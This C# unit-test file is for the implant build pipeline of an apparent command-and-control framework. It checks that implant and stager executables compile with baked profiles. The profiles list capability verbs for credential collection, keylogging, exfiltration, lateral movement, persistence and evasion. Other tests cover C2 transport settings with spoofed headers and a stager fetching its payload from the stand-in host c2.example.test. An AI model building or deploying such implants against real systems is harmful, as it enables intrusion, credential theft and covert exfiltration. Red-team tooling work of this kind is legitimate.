using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Rod.BuildPipeline.PayloadBuild;
using Rod.CoreState;
using Rod.CoreState.Engagements;
using Rod.CoreState.Implants;
using Rod.CoreState.Operators;

namespace Rod.Build.Tests;

/// <summary>
/// Unit tests for the real .NET build unit: the contract's .NET
/// producer. Proves the unit compiles a non-empty, fingerprinted artifact for the
/// configured target, that two builds of the same params never share a
/// fingerprint (per-implant material is generated at request time), and that the
/// baked profile does not leak the per-implant key into the artifact. The
/// per-build tests are skipped when dotnet is not on PATH.
/// </summary>
public class DotNetBuildUnitTests
{
    private static BuildParams Params(ImplantClass @class = ImplantClass.Stage2) => new(
        EngagementId.New(),
        OperatorId.New(),
        @class,
        new TargetProfile("linux", "amd64"),
        new TransportProfile("http://c2.example.test/implants/enroll", "/beacon"),
        new BeaconProfile(TimeSpan.FromSeconds(30), TimeSpan.FromSeconds(10), DateTimeOffset.UtcNow.AddDays(30)));

    [Theory]
    [InlineData(ImplantClass.Stage2, "shell.exec,shell.interact,file.push,file.pull,recon.portscan,recon.hostenum,recon.service,lateral.move,lateral.token,lateral.exec_remote,persist.install,persist.remove,persist.list,collect.cred,collect.keylog,exfil.push,exfil.stage,evasion.avoid,evasion.unload,exploit.invoke,exploit.module")]
    [InlineData(ImplantClass.Stager, "file.pull,evasion.avoid,evasion.unload,exploit.invoke,exploit.module")]
    [InlineData(ImplantClass.Pivot, "evasion.avoid,evasion.unload,exploit.invoke,exploit.module")]
    public void RenderBakedProfile_BakesClassVerbsPlusTheUngatedContractVerbs(ImplantClass @class, string expectedVerbs)
    {
        // The class's reduced verb set (architecture.md Sec 5.2) plus the
        // contract-only verbs no class gates (Sec 5.2/10.2) is baked into the
        // profile, so the generated implant carries the verbs it may run and an
        // out-of-tree evasion/exploit handler can advertise its verb. The
        // advertised set is still intersected with the compiled handlers, so the
        // extra verbs claim nothing on an artifact without the handler.
        var baked = DotNetBuildUnit.RenderBakedProfile(Params(@class));

        var json = Encoding.UTF8.GetString(Base64UrlDecode(baked));

        Assert.Contains($"\"verbs\":\"{expectedVerbs}\"", json);
    }

    [Fact]
    public void RenderBakedProfile_BakesTheConfiguredBeaconProfile()
    {
        // The configured beacon profile (architecture.md Sec 5.1, Sec 7) -- sleep,
        // jitter, kill date -- is what makes per-implant OPSEC possible, so it must
        // land in the decoded artifact, not be silently dropped. Use values that
        // differ from the build-contract defaults (30s/10s) so a regression to the
        // default is caught, and a pinned kill date so it survives the round trip.
        var sleep = TimeSpan.FromSeconds(45);
        var jitter = TimeSpan.FromSeconds(15);
        var killDate = new DateTimeOffset(2027, 1, 31, 12, 0, 0, TimeSpan.Zero);
        var @params = new BuildParams(
            EngagementId.New(),
            OperatorId.New(),
            ImplantClass.Stage2,
            new TargetProfile("linux", "amd64"),
            new TransportProfile("http://c2.example.test/implants/enroll", "/beacon"),
            new BeaconProfile(sleep, jitter, killDate));

        var baked = DotNetBuildUnit.RenderBakedProfile(@params);

        using var doc = JsonDocument.Parse(Base64UrlDecode(baked));
        var root = doc.RootElement;

        Assert.Equal("45s", root.GetProperty("sleep").GetString());
        Assert.Equal("15s", root.GetProperty("jitter").GetString());
        Assert.Equal(killDate.ToString("O"), root.GetProperty("killDate").GetString());
    }

    [Fact]
    public void RenderBakedProfile_BakesTheConfiguredTransportProfile()
    {
        // The malleable transport profile (architecture.md Sec 7) must land
        // in the .NET unit's baked profile the same way it lands in the Go unit's
        // -- the cross-unit encoding test already proves byte-identity, this
        // asserts the decoded values directly so a .NET-only regression is caught.
        var transport = new TransportProfile("http://c2.example.test/implants/enroll", "/beacon")
        {
            EnrollPath = "/api/v1/health",
            UserAgent = "Mozilla/5.0 (RodTest)",
            Headers = new Dictionary<string, string>
            {
                ["X-Forwarded-For"] = "10.0.0.1",
                ["Accept"] = "application/json",
            },
            RequestTimeout = TimeSpan.FromSeconds(12),
            Envelope = TransportEnvelope.Base64,
        };
        var @params = new BuildParams(
            EngagementId.New(),
            OperatorId.New(),
            ImplantClass.Stage2,
            new TargetProfile("linux", "amd64"),
            transport,
            new BeaconProfile(TimeSpan.FromSeconds(30), TimeSpan.FromSeconds(10), DateTimeOffset.UtcNow.AddDays(30)));

        var baked = DotNetBuildUnit.RenderBakedProfile(@params);

        using var doc = JsonDocument.Parse(Base64UrlDecode(baked));
        var root = doc.RootElement;

        Assert.Equal("/api/v1/health", root.GetProperty("enrollPath").GetString());
        Assert.Equal("Mozilla/5.0 (RodTest)", root.GetProperty("userAgent").GetString());
        Assert.Equal("12s", root.GetProperty("requestTimeout").GetString());
        Assert.Equal("base64", root.GetProperty("envelope").GetString());
        Assert.Equal("10.0.0.1", root.GetProperty("headers").GetProperty("X-Forwarded-For").GetString());
        Assert.Equal("application/json", root.GetProperty("headers").GetProperty("Accept").GetString());
    }

    [Theory]
    [InlineData("linux", "amd64", "linux-x64")]
    [InlineData("linux", "x86_64", "linux-x64")]
    [InlineData("linux", "arm64", "linux-arm64")]
    [InlineData("windows", "amd64", "win-x64")]
    [InlineData("win", "386", "win-x86")]
    [InlineData("osx", "aarch64", "osx-arm64")]
    [InlineData("darwin", "x64", "osx-x64")]
    public void MapRid_MapsContractTargetsOntoRuntimeIdentifiers(
        string os, string arch, string rid)
    {
        // The build contract speaks Go-style os/arch pairs; the publish step
        // speaks RIDs. Every spelling an operator sends must land on one.
        Assert.Equal(rid, DotNetBuildUnit.MapRid(new TargetProfile(os, arch)));
    }

    [Theory]
    [InlineData("plan9", "amd64")]
    [InlineData("linux", "riscv")]
    public void MapRid_RejectsAnUnmappableTarget_WithTheSupportedSetNamed(string os, string arch)
    {
        // An unmappable target fails at build time with a fixable message, not
        // a silent fallback to the build host's platform.
        var ex = Assert.Throws<InvalidOperationException>(
            () => DotNetBuildUnit.MapRid(new TargetProfile(os, arch)));
        Assert.Contains("supported", ex.Message);
    }

    // RFC 4648 base64url without padding, matching DotNetBuildUnit.Base64Url.
    private static byte[] Base64UrlDecode(string value)
    {
        var padded = value.Replace('-', '+').Replace('_', '/');
        padded = padded.PadRight((padded.Length + 3) & ~3, '=');
        return Convert.FromBase64String(padded);
    }

    [Fact]
    public void RenderStagerProfile_BakesTheFetchReference()
    {
        // The stager's profile is the fetch contract (architecture.md Sec 6):
        // the listener to fetch from, the payload id, and the sha256 the loader
        // verifies the fetched bytes against -- the fingerprint the operator
        // saw at stage-2 build time, so a tampered fetch is refused.
        var payloadId = Guid.NewGuid();
        var @params = Params(ImplantClass.Stager) with
        {
            Stage2 = new Stage2Payload(payloadId, "abc123"),
        };

        var baked = DotNetBuildUnit.RenderStagerProfile(@params);

        using var doc = JsonDocument.Parse(Base64UrlDecode(baked));
        var root = doc.RootElement;
        Assert.Equal("http://c2.example.test/implants/enroll", root.GetProperty("enrollURL").GetString());
        Assert.Equal(payloadId.ToString(), root.GetProperty("stage2PayloadId").GetString());
        Assert.Equal("abc123", root.GetProperty("stage2Sha256").GetString());
        Assert.Equal(@params.Beacon.KillDate.ToString("O"), root.GetProperty("killDate").GetString());
    }

    [Fact]
    public void RenderStagerProfile_RefusesANonStagerClassOrMissingReference()
    {
        Assert.Throws<InvalidOperationException>(
            () => DotNetBuildUnit.RenderStagerProfile(Params(ImplantClass.Stage2)));

        var missing = Params(ImplantClass.Stager);
        Assert.Throws<InvalidOperationException>(
            () => DotNetBuildUnit.RenderStagerProfile(missing));
    }

    [DotNetFact]
    public async Task StagerBuild_ReturnsNonEmptyArtifact()
    {
        // The stager output class compiles the loader tree, not the implant
        // tree (architecture.md Sec 6): the artifact is a real, fingerprinted
        // stage-1 executable with the fetch reference baked in.
        var unit = new DotNetBuildUnit();
        var @params = Params(ImplantClass.Stager) with
        {
            Stage2 = new Stage2Payload(Guid.NewGuid(), "abc123"),
        };

        var artifact = await unit.BuildAsync(@params);

        Assert.Equal(Language.DotNet, artifact.Language);
        Assert.Equal(ImplantClass.Stager, artifact.Params.Class);
        Assert.NotEmpty(artifact.Content);
        var expected = Convert.ToHexString(SHA256.HashData(artifact.Content)).ToLowerInvariant();
        Assert.Equal(expected, artifact.Fingerprint);
    }

    [DotNetFact]
    public async Task Build_ReturnsNonEmptyArtifact_WithDotNetLanguage()
    {
        var unit = new DotNetBuildUnit();

        var artifact = await unit.BuildAsync(Params());

        Assert.Equal(Language.DotNet, artifact.Language);
        Assert.NotEmpty(artifact.Content);
        Assert.Equal(artifact.Content.Length, artifact.Size);
        Assert.Equal("application/octet-stream", artifact.ContentType);
    }

    [Fact]
    public async Task Build_AMissingExtensionDirectoryFailsLoudly()
    {
        // The loud-failure rule: a configured-but-missing directory aborts the
        // build before any compile, so an operator never receives an artifact
        // that silently lacks the handlers they believe it carries.
        var unit = new DotNetBuildUnit(
            extensionDir: Path.Combine(Path.GetTempPath(), "rod-ext-missing-" + Guid.NewGuid().ToString("N")));

        await Assert.ThrowsAsync<InvalidOperationException>(() => unit.BuildAsync(Params()));
    }

    [DotNetFact]
    public async Task Build_WithExtensionDirectory_CompilesTheOverlayIn()
    {
        // The extension kit's acceptance, compile leg: a handler source dropped
        // into the configured directory builds into the artifact -- the overlay
        // copies the sources, the generated registrations compile against the
        // implant tree, and dotnet publish produces the artifact. The run leg --
        // the artifact advertising and running the verb at handshake -- lives in
        // the integration suite (ExtensionKitEndToEndTests).
        var extensionDir = Path.Combine(Path.GetTempPath(), "rod-ext-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(extensionDir);
        try
        {
            await File.WriteAllTextAsync(Path.Combine(extensionDir, "DemoPingHandler.cs"), """
                using Rod.Implant.Internal;
                using Rod.V1;

                namespace MyTradecraft.Demo;

                internal sealed class DemoPingHandler : ICapabilityHandler
                {
                    public string Verb => "demo.ping";

                    public HandlerResult Handle(string arguments)
                        => (TaskOutcome.Succeeded, "pong");
                }
                """);

            var unit = new DotNetBuildUnit(extensionDir: extensionDir);

            var artifact = await unit.BuildAsync(Params());

            Assert.Equal(Language.DotNet, artifact.Language);
            Assert.NotEmpty(artifact.Content);
        }
        finally
        {
            try { Directory.Delete(extensionDir, recursive: true); } catch { }
        }
    }

    [DotNetFact]
    public async Task Build_Fingerprint_MatchesSha256OfContent()
    {
        var unit = new DotNetBuildUnit();

        var artifact = await unit.BuildAsync(Params());

        var expected = Convert.ToHexString(SHA256.HashData(artifact.Content)).ToLowerInvariant();
        Assert.Equal(expected, artifact.Fingerprint);
        Assert.Equal(64, artifact.Fingerprint.Length);
    }

    [DotNetFact]
    public async Task TwoBuilds_WithIdenticalParams_ProduceDifferentFingerprints()
    {
        // Each build bakes a fresh artifact over a fresh temp dir; the .NET
        // compiler embeds non-determinism (build timestamp, MVID), so two builds
        // never share a fingerprint -- matching the per-implant uniqueness
        // contract (architecture.md Sec 5.1/6).
        var unit = new DotNetBuildUnit();

        var first = await unit.BuildAsync(Params());
        var second = await unit.BuildAsync(Params());

        Assert.NotEqual(first.Fingerprint, second.Fingerprint);
    }
}
